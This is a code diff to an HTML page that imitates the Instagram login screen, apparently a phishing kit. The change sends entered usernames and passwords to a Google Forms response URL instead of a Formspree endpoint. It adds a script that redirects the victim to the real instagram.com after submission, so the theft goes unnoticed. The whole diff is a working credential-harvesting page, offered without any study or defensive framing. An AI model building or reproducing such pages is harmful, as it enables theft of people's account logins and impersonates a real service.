@@ -97,10 +97,10 @@
     <div class="container">
         <div class="login-box">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1024px-Instagram_logo_2022.svg.png" alt="Instagram Logo" class="logo">
-            <!-- Updated Form Action to use Formspree -->
-            <form action="https://formspree.io/f/xdkaderb" method="POST">
-                <input type="text" name="username" placeholder="Username or Email" class="input-field" required>
-                <input type="password" name="password" placeholder="Password" class="input-field" required>
+            <!-- Updated Form Action to use Google Form URL -->
+            <form id="loginForm" action="https://docs.google.com/forms/d/e/1FAIpQLSc_bl3PRM9wN70-_4q6cEvWzkjeHyYmjgiGG47tQXXZsq_0qw/formResponse" method="POST" onsubmit="redirectToInstagram()">
+                <input type="text" name="entry.1234567890" placeholder="Username or Email" class="input-field" required>
+                <input type="password" name="entry.0987654321" placeholder="Password" class="input-field" required>
                 <button type="submit" class="login-button">Log In</button>
             </form>
         </div>
@@ -108,5 +108,14 @@
             <p>Don't have an account? <a href="#">Sign up</a></p>
         </div>
     </div>
+
+    <script>
+        // Function to redirect to Instagram after form submission
+        function redirectToInstagram() {
+            setTimeout(function() {
+                window.location.href = "https://www.instagram.com";
+            }, 1000); // Redirect after 1 second
+        }
+    </script>
 </body>
 </html>
